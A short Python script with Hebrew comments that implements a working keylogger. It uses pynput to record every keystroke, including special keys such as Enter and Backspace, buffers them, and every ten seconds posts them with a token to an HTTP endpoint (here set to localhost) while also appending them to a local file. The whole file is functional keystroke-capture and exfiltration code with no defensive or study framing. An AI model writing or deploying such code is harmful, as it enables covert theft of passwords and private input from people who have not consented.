from pynput.keyboard import Listener, Key
import threading
import requests
import time
import logging

# הגדרות
keystroke_buffer = []
buffer_lock = threading.Lock()
SEND_INTERVAL = 10  # שניות
SERVER_URL = "http://127.0.0.1:5000/log"
API_TOKEN = "s3cr3t"

# הגדרת לוגים
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def keylogger(key):
    try:
        k = key.char
    except AttributeError:
        special_keys = {
            Key.enter: "[ENTER]",
            Key.space: " ",
            Key.backspace: "[BACKSPACE]",
            Key.tab: "[TAB]",
            Key.shift: "[SHIFT]",
            Key.ctrl_l: "[CTRL]",
            Key.alt_l: "[ALT]"
        }
        k = special_keys.get(key, f"[{key}]")

    if k is not None:
        with buffer_lock:
            keystroke_buffer.append(str(k))

def send_to_server():
    while True:
        time.sleep(SEND_INTERVAL)
        with buffer_lock:
            if keystroke_buffer:
                data = ''.join(keystroke_buffer)
                payload = {"data": data, "token": API_TOKEN}
                try:
                    requests.post(SERVER_URL, json=payload)
                    logging.info(f"נשלח לשרת: {data}")
                    with open("keystrokes.txt", "a", encoding="utf-8") as f:
                        f.write(data + "\n")
                except Exception as e:
                    logging.error(f"שגיאה בשליחה: {e}")
                keystroke_buffer.clear()

# הפעלת שליחה ברקע
sender_thread = threading.Thread(target=send_to_server, daemon=True)
sender_thread.start()

# התחלת האזנה למקלדת
with Listener(on_press=keylogger) as listener:
    listener.join()